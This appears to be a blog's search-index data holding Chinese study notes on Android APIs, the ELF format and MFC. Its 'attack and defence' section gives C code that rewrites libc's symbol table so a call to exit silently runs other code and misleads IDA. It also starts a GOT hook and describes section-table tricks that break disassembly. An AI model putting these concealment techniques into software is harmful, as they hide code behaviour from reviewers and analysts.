Manifest文件中说明权限. 新建一个类继承BroadcastReceiver. 注册短信广播. 需要应用有接收短信的权限,方可接收到短信广播. 源代码 广播.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:14","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"文件 Android中每个应用有自己的私有空间,其他应用不允许访问. 文件存储 配置文件(保存键值对数据) 使用 SharedPreferences API. 创建配置文件并写内容. 创建的文件,在根目录的data/data/包名目录中. 读取配置文件. 自定义文件格式 使用Java中的文件流 示例 创建的文件,在根目录的data/data/包名目录中. 共享存储 Android中SD卡内容,所有应用共享. 说明权限. 操作示例. [Android 10.0后创建文件createNewFile()和创建文件夹mkdirs()均失败解决方案.mhtml](Android 10.0后创建文件createNewFile()和创建文件夹mkdirs()均失败解决方案.mhtml) 源代码 文件.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:15","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"数据库 创建数据库和表 增 删 改 查 注意 使用Android封装好的SQL操作,可以防止SQL注入. 源代码 数据库.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:16","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"内容提供程序 内容提供者 创建一个类继承ContentProvider, 实现增删改查接口. 在Manifest文件中注册内容提供者. 源代码 内容提供者.rar 内容接收者 拿上述内容提供者的数据 增 删 改 查 源代码 内容接收者.rar 拿系统内容提供者的数据 拿联系人信息 在Manifest文件中说明. 示例. 拿联系人信息.rar 拿短信信息 在Manifest文件中说明. 示例. 拿短信信息.rar 内容观察者 向系统注册一个内容观察者,当内容发生了变化,就会收到通知. 在Manifest文件中说明. 写一个类继承ContentObserver,重写onChange函数. 注册内容观察者. 源代码 内容观察者.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:17","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Fragment Activity中放Fragment,Fragment中放布局,可以用来切换视图. 新建一个布局文件. 写一个类继承Fragment,重写onCreateView函数. 静态注册. 动态注册. 源代码 Fragment.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:18","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"功能操作 遍历系统安装的软件 管理器 示例 通过包管理器,我们可以知道系统安装的软件. 启动应用 卸载应用 遍历进程 流量查看 低版本用TrafficStats 不准确,高版本用NetworkStatsManager. 监控电话 屏幕截图 Android5.0以后,加入了屏幕采集的API. 示例 屏幕截图.rar 无视权限,截图 在Android系统的system/bin目录下有screencap这个程序,这就是用来截图的.只有当uid = shell或者uid = root才可以调screencap来截图. shell权限,就是cmd 执行adb shell. 获取Root权限 未root的手机,system/bin目录下没有su这个程序,所谓的root就是在system/bin目录下放su这个程序. 模拟键盘 鼠标 触摸等 在system/bin目录下 有个input程序. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:19","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"网络编程 使用Java的API 示例 PC端为Server, Android端为Client. Server Java中的收发数据跟读写文件一样,一切都是流. 网络编程Server.rar Client 网络编程Client.rar 注意 Android为Client, PC为Server时, 若通过回环地址连接,Android端需填 10.0.2.2 Android为Server, PC为Client时, 若通过回环地址连接,PC端需要做端口映射, 在Android虚拟机打开的情况下,通过adb命令 adb forward tcp:port tcp:port Android端执行CMD命令 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:20","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"ELF 是UNIX系统实验室(USL)作为应用程序二进制接口(Application Binary Interface,ABI)而开发和发布的,也是Linux的主要可执行文件格式.全称是Executable and Linking Format,这个名字相当关键,包含了ELF所需要支持的两个功能——执行和链接. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:0:0","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"准备工作 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:1:0","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"准备一个Elf文件 int main(int argc, char* argv[]){ printf(\"Hello ELF!\\n\"); return 0; } ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:1:1","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"makefile脚本 AS_PATH := /data/local/tmp ELF_PATH := E:/SoftWareWork/AndroidStudioWork/LuoELF/app/build/intermediates/cmake/debug/obj/armeabi-v7a ELF_NAME := luoelf all: adb push $(ELF_PATH)/$(ELF_NAME) $(AS_PATH) adb shell chmod a+x $(AS_PATH)/$(ELF_NAME) adb shell $(AS_PATH)/$(ELF_NAME) ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:1:2","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"文件格式 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:0","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"概述 程序头表指向段,等价于PE中的节,用来描述内存映射. 节头表指向节,类似PE的数据目录,指向各种表. 在Obj文件中段是可选的,在可执行文件中节是可选的,但是NDK编译出的ELF文件,段和节都是有的. 总体来说就是一个ELF文件包含3部分,ELF文件头、节、段. 数据类型 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:1","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"ELF文件头 #define EI_NIDENT 16 typedef struct { unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx; } Elf32_Ehdr; e_ident 这16字节是ELF标识,前4字节是文件标志,不可修改. EI_CLASS 这个字节指明了文件类型. Android系统不检查这个字节,它是通过判断指令集v7a,v8a来确定是32位还是64位. IDA检查了这个字节,如果修改了这个字节,IDA就无法反汇编. EI_DATA 这个字节决定了接下来ELF文件结构体的解析是按大尾方式还是小尾方式. Android系统不检查这个字节,默认为小尾方式. IDA检查了这个字节,如果修改了这个字节,IDA就无法反汇编. EI_VERSION ELF文件头的版本. e_type 这2字节是文件类型. Android5.0之后,可执行文件全部为so文件. Android高版本,这2字节只能是03,不能修改. e_machine 这2字节是指令集,可在elf-em.h这个头文件中,查看扩展指令集. 这2字节不可修改. e_version 这4字节指明目标文件的版本. Android系统不检查这4字节. IDA检查了这4字节,不过影响不大,如果修改了,IDA还是可以反汇编. e_entry 这4字节是程序入口点(OEP),是个RVA. 但如果上面e_type的值是02,这个值就是VA. 如果是共享库文件,这4字节是0. 如果是可执行文件,这4字节不是0. 这是共享库文件和可执行文件很重要的差别. e_phoff 这4字节是程序头表偏移,如果没有程序头表,该值应为0. e_shoff 这4字节是节头表偏移,如果没有节头表,该值应为0. 在Android对抗中,删节表是很常见的. e_flags 这4字节是个标志,没什么用. e_ehsize 这2字节是ELF文件头大小,以字节为单位. Android系统,不检查这2字节,默认ELF文件头大小为52字节. IDA检查了这2字节,如果我们修改了这2字节内容.IDA只会产生警告,影响不大,仍然可以反汇编. e_phentsize 这2字节表明程序头表每一个表项的大小,以字节为单位. e_phnum 这2字节表明程序头表总共有多少表项,如果没有程序头表,该值应设为0. e_shentsize 这2字节表明节头表每一个表项的大小,以字节为单位. e_shnum 这2字节表明节头表总共有多少表项,如果没有节头表,该值应设为0. e_shstrndx 这2字节是节头表中与节名字表相对应表项的索引. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:2","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"节 typedef struct { Elf32_Word sh_name; //节名字 Elf32_Word sh_type; //节类型 Elf32_Word sh_flags; //节内存属性 Elf32_Addr sh_addr; //内存地址 Elf32_Off sh_offset; //文件偏移 Elf32_Word sh_size; //节大小 Elf32_Word sh_link; //一个索引值,指向节头表中本节所对应的位置 Elf32_Word sh_info; //节的附加信息,根据节的类型不同,本成员的意义也有所不同 Elf32_Word sh_addralign; //对齐值 Elf32_Word sh_entsize; //有一些节的内容是一张表,其中每一个表项的大小是固定的,比如符号表.对于这种表来说,本成员指定其每一个表项的大小 } Elf32_Shdr; sh_name 4字节,是个偏移值,暂记为P1. 首先通过ELF文件头最后一项e_shstrndx拿到节表中节名称表对应表项的索引, 然后在节表中找到该项,找到sh_offset文件偏移值,暂记为P2 最后将P1 + P2,即可得到该节名字的字符串文件偏移值. sh_type 4字节,节类型. typedef enum \u003cElf32_Word\u003e { SHT_NULL = 0x0, /* Inactive section header */ SHT_PROGBITS = 0x1, /* Information defined by the program */ SHT_SYMTAB = 0x2, /* Symbol table - not DLL */ SHT_STRTAB = 0x3, /* String table */ SHT_RELA = 0x4, /* Explicit addend relocations, Elf64_Rela */ SHT_HASH = 0x5, /* Symbol hash table */ SHT_DYNAMIC = 0x6, /* Information for dynamic linking */ SHT_NOTE = 0x7, /* A Note section */ SHT_NOBITS = 0x8, /* Like SHT_PROGBITS with no data */ SHT_REL = 0x9, /* Implicit addend relocations, Elf64_Rel */ SHT_SHLIB = 0xA, /* Currently unspecified semantics */ SHT_DYNSYM = 0xD, /* Symbol table for a DLL */ SHT_INIT_ARRAY = 0xE, /* Array of constructors */ SHT_FINI_ARRAY = 0xF, /* Array of deconstructors */ SHT_PREINIT_ARRAY = 0x10, /* Array of pre-constructors */ SHT_GROUP = 0x11, /* Section group */ SHT_SYMTAB_SHNDX = 0x12, /* Extended section indeces */ SHT_NUM = 0x13, /* Number of defined types */ SHT_LOOS = 0x60000000, /* Lowest OS-specific section type */ SHT_GNU_ATTRIBUTES = 0x6ffffff5, /* Object attribuytes */ SHT_GNU_HASH = 0x6ffffff6, /* GNU-style hash table */ SHT_GNU_LIBLIST = 0x6ffffff7, /* Prelink library list */ SHT_CHECKSUM = 0x6ffffff8, /* Checksum for DSO content */ SHT_LOSUNW = 0x6ffffffa, /* Sun-specific low bound */ SHT_SUNW_move = 0x6ffffffa, // Same thing SHT_SUNW_COMDAT = 0x6ffffffb, SHT_SUNW_syminfo = 0x6ffffffc, SHT_GNU_verdef = 0x6ffffffd, /* Version definition section */ SHT_GNU_verdneed = 0x6ffffffe, /* Version needs section */ SHT_GNY_versym = 0x6fffffff, /* Version symbol table */ SHT_HISUNW = 0x6fffffff, /* Sun-specific high bound */ SHT_HIOS = 0x6fffffff, /* Highest OS-specific section type */ SHT_LOPROC = 0x70000000, /* Start of processor-specific section type */ SHT_HIPROC = 0x7fffffff, /* End of processor-specific section type */ SHT_LOUSER = 0x80000000, /* Start of application-specific */ SHT_HIUSER = 0x8fffffff /* Ennd of application-specific */ } s_type32_e; sh_flags 4字节,由一系列标志比特位组成. sh_addr 4字节,内存地址. sh_offset 4字节,文件偏移. sh_size 4字节,节大小. sh_link 4字节,一个索引值,指向节头表中本节所对应的位置. sh_info 4字节,节的附加信息,根据节的类型不同,本成员的意义也有所不同. sh_addralign 4字节, 对齐值. sh_entsize 4字节,有一些节的内容是一张表,其中每一个表项的大小是固定的,比如符号表,对于这种表来说,本成员指定其每一个表项的大小. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:3","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"特殊节 /*节名字不重要,重要的是节的类型. 当节名字未被修改过,是具有参考价值的. */ .shstrtab 节名称表 .text 代码段 .bss 数据段(未初始化) .data 数据段(初始化) .rodata 常量区 //ndk的版本信息,仅供参考 .note.android.ident .note.gnu.build - id .note.gnu.gold - version //编译器版本信息 .comment .gnu.version .gnu.version_r .ARM.attributes //调试信息,等价于PDB文件 .debug_str .debug_abbrev .debug_info .debug_macinfo .debug_frame .debug_line .debug_loc .debug_ranges .debug_aranges //初始化表 .init_array //初始化函数表 .fini_array //反初始化函数表 //异常表, 不是ELF的标准,是由操作系统和编译器自定义的 .ARM.exidx //索引表 .ARM.extab //异常表 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:4","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"符号表 //符号表 //当打包为apk,里面的动态库只有.dynsym .dynsym .symtab //符号表字符串 .dynstr .strtab 符号表项结构 typedef struct { Elf32_Word st_name; //符号的名字,指向字符串表的索引 Elf32_Addr st_value; //符号的值, 地址, 是个RVA Elf32_Word st_size; //符号的大小 unsigned char st_info; //符号的类型和属性 unsigned char st_other; //暂未使用 Elf32_Half st_shndx; //一个索引值,指向相关联的节在节头表中的索引 } Elf32_Sym; 符号表描述了导入和导出,st_value的值为非0,表示是导出为0,则表示是导入. st_name 指向字符串表的索引,节头表中的link值说明了是哪个字符串表. st_info #define ELF32_ST_BIND(i) ((i)\u003e\u003e4) #define ELF32_ST_TYPE(i) ((i)\u00260xf) #define ELF32_ST_INFO(b,t) (((b)\u003c\u003c4)+((t)\u00260xf)) 高4字节是符号绑定. 低4字节是符号类型. st_shndx 这里我们导出一个全局变量,来理解下这个字段的意思. 源代码 int g_n = 100; int main(int argc, char* argv[]) { printf(\"Hello ELF! %d\\n\", g_n); return 0; } 分析 从上图中可以看到,导出的全局变量g_n的RVA为0x2000,大小为4字节,st_shndx字段为22. 那么这个全局变量的值在文件偏移的哪个地方记录呢? 我们去节头表中的第22项看下. 节头表的第22项,所在的RVA是0x2000,FOA是0x1000, 而全局变量g_n的RVA为0x2000,大小为4字节, 也就是说文件偏移0x1000的地方开始是4字节内容就是全局变量的值,100. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:5","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"哈希表 //哈希表 .hash //旧版,导入导出均可查 .gnu.hash //新版,效率高,只可查导出 旧版(.hash) 哈希表结构 Bucket数组中含有nbucket个项,chain数组中含有nchain个项,序号都从0开始. Bucket和chain中包含的都是符号表中的索引.hash有可能冲突,chain里面放的就是所有冲突的. 给定一个符号名字,返回一个哈希值x,然后由bucket[x%nbucket]得到一个符号表索引y, 如果索引y对应的符号表项不是想要的符号(通过对比名字),则由chain[y]得到下一个符号表索引z,如果仍不是想要的符号,继续chain[z]…, 如果chain[z]的值为0,说明该符号不存在. 哈希算法 原始算法 unsigned long elf_hash(const unsigned char* name) { unsigned long h = 0, g; while (*name) { h = (h \u003c\u003c 4) + *name++; if (g = h \u0026 0xf0000000) h ^= g \u003e\u003e 24; h \u0026= ~g; } return h; } Android中的hash算法 Google并没有用原始的hash算法. //http://androidxref.com/4.0.3_r1/xref/bionic/linker/linker.c#elfhash static unsigned elfhash(const char* _name) { const unsigned char* name = (const unsigned char*)_name; unsigned h = 0, g; while (*name) { h = (h \u003c\u003c 4) + *name++; g = h \u0026 0xf0000000; h ^= g; h ^= g \u003e\u003e 24; } return h; } 示例 环境:解压AndroidStudio编译出来的Release版apk,查看其中的so文件. 目标:查找main这个符号. 查看.hash数据. 可以得到: nbucket = 0x11 nchain = 0x14 计算hash%nbucket. 得到的结果y = 10. 查找main. y = 10,bucket[y] = 7,查看动态符号表的第7项不是main, chain[7] = 3,查看动态符号表的第3项不是main, chain[3] = 0x11,查看动态符号表的第17项是main. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:6","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"程序链接表 .plt //过程链接,Procedure Link Table 外部调用的跳板,是个代理函数. IDA是通过节表拿到plt节的地址,从而解析plt函数的. 从上图中可以看到每两个plt函数之间的大小为12字节, 假如我们将节表中plt节的偏移加12字节的倍数,IDA解析api就会错位,实际上也确是如此. 这样修改之后不会影响程序的运行,因为程序的运行是不需要节表的. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:7","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"全局偏移表 .got //等价于PE中的IAT表,Global Offset Table 记录外部调用的入口地址. plt和got的关系 //每调一个api,编译器就会生成一个plt函数 int (*g_printf)(const char* __fmt, ...) = plt; /* * plt: * jmp [got] * * got: * load1 * * load1: * dlopen * dlsym * got = addr */ ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:8","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"重定位表 .rel.plt //修api地址 .rel.dyn //修全局变量 项结构 typedef struct { Elf32_Addr r_offset; //Rva,修完之后放在哪里 Elf32_Word r_info; //既给出了重定位所作用的符号表索引,也给出了重定位的类型 } Elf32_Rel; typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend; } Elf32_Rela; r_info 的宏定义 #define ELF32_R_SYM(i) ((i)\u003e\u003e8) //高24位是符号表索引,修的位置 #define ELF32_R_TYPE(i) ((unsigned char)(i)) //低8位是重定位的类型,如何修 #define ELF32_R_INFO(s,t) (((s)\u003c\u003c8)+(unsigned char)(t)) 示例 Elf32_Xword s_entsize = 8, 表示每项为8字节 第一项为 F0 1F 00 00 16 02 00 00 r_offset: 0x1FF0 符号表索引:0x02 重定位类型:0x16 IDA查看偏移 符号表第2项 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:9","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"动态节 .dynamic /*这里存放了软件运行时所需要的表,操作系统是从这里拿表的. 但是这样说又有点矛盾,因为我们前面讲软件的运行是不需要节表的. 那么操作系统不通过节表,如何拿到动态节的地址? 段中有描述.*/ 项结构 typedef struct { Elf32_Sword d_tag; //什么表 union { //在哪里 Elf32_Word d_val; Elf32_Addr d_ptr; } d_un; } Elf32_Dyn; d_tag DT_NEEDED 这里面存放的是软件运行所需要的动态库. 前面我们讲符号表和重定位表,都没有提到对应的api在哪个库里面. 假设软件运行需要两个库,libc.so、 libm.so 现在有一个api,操作系统会看这个api在libc.so里面没, 如果不在,就去看libm.so里面有没有这个导出函数. 操作系统就这样遍历需要加载的库,就知道对应的api在哪个库里面了. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:10","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"程序头表 用来保存程序加载到内存中所需要的信息,用段(segment)来表示,与节头表类似,同样是数组结构. 数组的位置在偏移e_phoff处,每个元素(segment header)的大小为e_phentsize,共有e_phnum个元素. 程序头结构 typedef struct { Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align; } Elf32_Phdr; p_type 类型 PT_NULL:表示该段未使用. PT_LOAD:表示要将文件中的segment内容映射到进程内存中对应的地址上. PT_DYNAMIC:动态节. PT_INTERP:包含interpreter的路径. PT_HDR:表示程序头表本身. p_offset 该段的文件偏移. p_vaddr 段数据应该加载到进程的虚拟地址. p_paddr 段数据应该加载到进程的物理地址. p_filesz 该段的文件大小. p_memsz 该段的内存大小. p_flags 段的内存属性. p_align 该段数据的对齐值. 段示例 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:11","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"攻防对抗 动态运行,修改api地址 要实现的效果是,代码中动态调用libc.so库中的exit函数,通过修改libc.so符号表中的exit函数的地址为任意函数地址,从而使在IDA中静态分析,看到的是调用exit函数,实际上调用的是其他函数.函数前加static关键字,可使该函数不导出. #include \u003cjni.h\u003e#include \u003cstring\u003e#include \u003cstdio.h\u003e #include \u003celf.h\u003e#include \u003cdlfcn.h\u003e#include \u003csys/mman.h\u003e #define SOINFO_NAME_LEN 128 struct soinfo { const char name[SOINFO_NAME_LEN]; Elf32_Phdr *phdr; int phnum; unsigned entry; unsigned base; unsigned size; int unused; // DO NOT USE, maintained for compatibility. unsigned *dynamic; unsigned wrprotect_start; unsigned wrprotect_end; soinfo *next; unsigned flags; const char *strtab; Elf32_Sym *symtab; unsigned nbucket; unsigned nchain; unsigned *bucket; unsigned *chain; unsigned *plt_got; Elf32_Rel *plt_rel; unsigned plt_rel_count; Elf32_Rel *rel; unsigned rel_count; Elf32_Rela *plt_rela; unsigned plt_rela_count; Elf32_Rela *rela; unsigned rela_count; unsigned *preinit_array; unsigned preinit_array_count; unsigned *init_array; unsigned init_array_count; unsigned *fini_array; unsigned fini_array_count; void (*init_func)(void); void (*fini_func)(void); unsigned *ARM_exidx; unsigned ARM_exidx_count; unsigned refcount; }; static unsigned elfhash(const char *_name) { const unsigned char *name = (const unsigned char *) _name; unsigned h = 0, g; while(*name) { h = (h \u003c\u003c 4) + *name++; g = h \u0026 0xf0000000; h ^= g; h ^= g \u003e\u003e 24; } return h; } //获取模块基址 void *get_module_base(const char *moduleName) { char buf[260] = {}; void *addr = NULL; FILE *fp = fopen(\"/proc/self/maps\", \"r\"); if (fp == NULL) { perror(\"fopen\"); return NULL; } while (!feof(fp)) { memset(buf, 0, sizeof buf); fgets(buf, sizeof buf, fp); if (strstr(buf, moduleName) != NULL) { sscanf(buf, \"%08x\", \u0026addr); break; } } fclose(fp); return addr; } void FillSoInfoStruct(soinfo* si, const char* szLibName){ //获取libc.so的模块基址 char* libc_base = (char*)get_module_base(szLibName); si-\u003ebase = (unsigned)libc_base; //拿动态节地址 elf32_hdr* header = (elf32_hdr*)si-\u003ebase; elf32_phdr* phdr = (elf32_phdr*)(si-\u003ebase + header-\u003ee_phoff); Elf32_Dyn *dyn = NULL; for (int i = 0; i \u003c header-\u003ee_phnum; ++i) { if (phdr[i].p_type == PT_DYNAMIC){ dyn = (Elf32_Dyn*)(si-\u003ebase + phdr[i].p_vaddr); si-\u003edynamic = (unsigned *)dyn; break; } } printf(\"dyn = %p\\n\", dyn); //遍历表 //遍历表的操作, Android源码中有写,这里查看的是Android 4.0.3_r1版本的源码 //在xref: /bionic/linker/linker.c中 //搜索DT_HASH unsigned *d; for(d = si-\u003edynamic; *d; d++){ switch(*d++){ case DT_HASH: si-\u003enbucket = ((unsigned *) (si-\u003ebase + *d))[0]; si-\u003enchain = ((unsigned *) (si-\u003ebase + *d))[1]; si-\u003ebucket = (unsigned *) (si-\u003ebase + *d + 8); si-\u003echain = (unsigned *) (si-\u003ebase + *d + 8 + si-\u003enbucket * 4); break; case DT_STRTAB: si-\u003estrtab = (const char *) (si-\u003ebase + *d); break; case DT_SYMTAB: si-\u003esymtab = (Elf32_Sym *) (si-\u003ebase + *d); break; } } } //获取函数名对应的符号表的下标 int GetSymtabIndex(soinfo* si, char* szFuncName){ //查询hash表 int nIndex = elfhash(szFuncName) % si-\u003enbucket; nIndex = si-\u003ebucket[nIndex]; if (nIndex == 0){ return 0; } do { if (strcmp(si-\u003estrtab + si-\u003esymtab[nIndex].st_name, szFuncName) == 0){ break; } nIndex = si-\u003echain[nIndex]; } while (nIndex != 0); return nIndex; } //替换后的函数 //加static,可使该函数不导出 static void fun2(int n){ puts(\"fun2\"); } __attribute__((constructor)) void fun1(){ puts(\"fun1\"); //soinfo结构体是操作系统内部的结构体 soinfo si = {0}; //填充soinfo结构体 FillSoInfoStruct(\u0026si, \"libc.so\"); //获取libc.so库中的exit函数在符号表中的下标 int nIndex = GetSymtabIndex(\u0026si, \"exit\"); if (nIndex == 0){ return; } //修改libc.so库中的exit函数地址为fun2的地址 mprotect((void*)((int)\u0026si.symtab[nIndex] \u0026 ~0xfff), 0x1000, PROT_READ | PROT_WRITE); si.symtab[nIndex].st_value = (char*)fun2 - (char*)si.base; } typedef void (*pfnEXIT)(int); int main(int argc, char* argv[]){ //直接调exit(0), 走的是plt函数 void* handle = dlopen(\"libc.so\", 0); pfnEXIT pfnExit = (pfnEXIT)dlsym(handle, \"exit\"); pfnExit(0); return 0; } 动态调用修改api地址.7z Got表Hook #include \u003cjni.h\u003e#include \u003cstring\u003e#include \u003cstdio.h\u003e #include \u003celf.h\u003e#include \u003cdlfcn.h\u003e#include \u003csys/mman.h\u003e #include \u003cunistd.h\u003e#include \u003climits.h\u003e #define SOINFO_NAME_LEN 128 struct soinfo { const char name[SOINFO_","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:12","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"参考文档 ELF文件格式解析.pdf ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:13","tags":["ELF"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["界面编程"],"content":"Mfc ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:0:0","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Radio Button 需设置group属性,才可在类向导对应类中的成员变量栏看到单选框. 若绑定变量类型为int,0,1,2…分别对应对话框中第几个单选框. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:1:0","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"示例 UpdateData(TRUE); switch (m_nGender) { case 0: { AfxMessageBox(\"性别 男\"); break; } case 1: { AfxMessageBox(\"性别 女\"); break; } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:1:1","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Combo Box 绑定CComboBox这个类型. //可向组合框中的项添加4字节的附加数据 int SetItemData( int nIndex, DWORD dwItemData ); DWORD GetItemData( int nIndex ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:0","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"初始化 //在OnInitDialog这个函数中写代码 int nItemIdx = 0; //向组合框中添加内容 m_cmbLocation.AddString(\"河南\"); m_cmbLocation.SetItemData(nItemIdx++, 10);//为每一项添加4字节的附加数据 m_cmbLocation.AddString(\"湖南\"); m_cmbLocation.SetItemData(nItemIdx++, 10); //设置组合框默认选项 m_cmbLocation.SetCurSel(0); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:1","tags":["Mfc"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取组合框选中项的文本 //获取当前选中的索引值 int nIdx = m_cmbLocation.GetCurSel(); //通过索引值获取文本 CString csBuf; m_cmbLocation.GetLBText(nIdx, csBuf); //获取保存在此项的4字节附加数据 DWORD dwExtraData = m_cmbLocation.GetItemData(nIdx); 